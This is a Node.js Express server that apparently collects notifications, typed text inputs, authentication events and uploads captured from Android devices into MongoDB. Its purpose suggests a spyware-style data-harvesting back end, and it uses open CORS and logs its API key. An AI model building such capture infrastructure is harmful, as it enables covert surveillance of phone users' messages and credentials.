const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const config = require('./config');

// Import routes
const notificationRoutes = require('./routes/notifications');
const textInputRoutes = require('./routes/textInputs');
const authenticationEventRoutes = require('./routes/authenticationEvents');
const uploadRoutes = require('./routes/upload');

const app = express();

// Security middleware
app.use(helmet());

// Rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 1000, // limit each IP to 1000 requests per windowMs
    message: {
        success: false,
        message: 'Too many requests from this IP, please try again later.'
    }
});
app.use('/api/', limiter);

// CORS configuration
app.use(cors({
    origin: '*', // In production, specify your Android app's origin
    methods: ['GET', 'POST', 'PUT', 'DELETE'],
    allowedHeaders: ['Content-Type', 'Authorization', 'x-api-key']
}));

// Body parsing middleware
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

// MongoDB connection
mongoose.connect(config.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
    dbName: config.DATABASE_NAME
})
.then(() => {
    console.log('✅ Connected to MongoDB Atlas successfully!');
    console.log(`📊 Database: ${config.DATABASE_NAME}`);
})
.catch((error) => {
    console.error('❌ MongoDB connection error:', error);
    process.exit(1);
});

// Routes
app.use('/api/notifications', notificationRoutes);
app.use('/api/text-inputs', textInputRoutes);
app.use('/api/authentication-events', authenticationEventRoutes);
app.use('/api/upload', uploadRoutes);
app.use('/uploads', express.static('uploads'));

// Health check endpoint
app.get('/health', (req, res) => {
    res.json({
        success: true,
        message: 'Server is running',
        timestamp: new Date().toISOString(),
        database: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected'
    });
});

// API documentation endpoint
app.get('/api', (req, res) => {
    res.json({
        success: true,
        message: 'Android Notification Capture API',
        version: '1.0.0',
        endpoints: {
            notifications: {
                'POST /api/notifications': 'Save notification data',
                'GET /api/notifications': 'Fetch notifications',
                'GET /api/notifications/stats': 'Get notification statistics'
            },
            textInputs: {
                'POST /api/text-inputs': 'Save text input data',
                'GET /api/text-inputs': 'Fetch text inputs',
                'GET /api/text-inputs/stats': 'Get text input statistics'
            },
            authenticationEvents: {
                'POST /api/authentication-events': 'Save authentication event data',
                'GET /api/authentication-events': 'Fetch authentication events',
                'GET /api/authentication-events/stats': 'Get authentication event statistics',
                'GET /api/authentication-events/security-analysis': 'Get security analysis'
            },
            system: {
                'GET /health': 'Server health check',
                'GET /api': 'API documentation'
            }
        },
        authentication: 'Use x-api-key header or api_key query parameter'
    });
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('Unhandled error:', error);
    res.status(500).json({
        success: false,
        message: 'Internal server error',
        error: config.NODE_ENV === 'development' ? error.message : 'Something went wrong'
    });
});

// 404 handler
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        message: 'Endpoint not found',
        availableEndpoints: [
            'GET /health',
            'GET /api',
            'POST /api/notifications',
            'GET /api/notifications',
            'GET /api/notifications/stats',
            'POST /api/text-inputs',
            'GET /api/text-inputs',
            'GET /api/text-inputs/stats',
            'POST /api/authentication-events',
            'GET /api/authentication-events',
            'GET /api/authentication-events/stats',
            'GET /api/authentication-events/security-analysis'
        ]
    });
});

// Start server
const PORT = config.PORT;
const HOST = config.HOST;
app.listen(PORT, HOST, () => {
    console.log('🚀 Server started successfully!');
    console.log(`📡 Server running on port ${PORT}`);
    console.log(`🌐 API Base URL: http://${HOST}:${PORT}/api`);
    console.log(`📚 API Documentation: http://${HOST}:${PORT}/api`);
    console.log(`💚 Health Check: http://${HOST}:${PORT}/health`);
    console.log(`📱 Android App URL: http://10.173.136.254:${PORT}/api`);
    console.log(`🔑 API Key: ${config.API_KEY}`);
});

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n🛑 Shutting down server...');
    await mongoose.connection.close();
    console.log('✅ MongoDB connection closed');
    process.exit(0);
});

process.on('SIGTERM', async () => {
    console.log('\n🛑 Shutting down server...');
    await mongoose.connection.close();
    console.log('✅ MongoDB connection closed');
    process.exit(0);
});

module.exports = app;
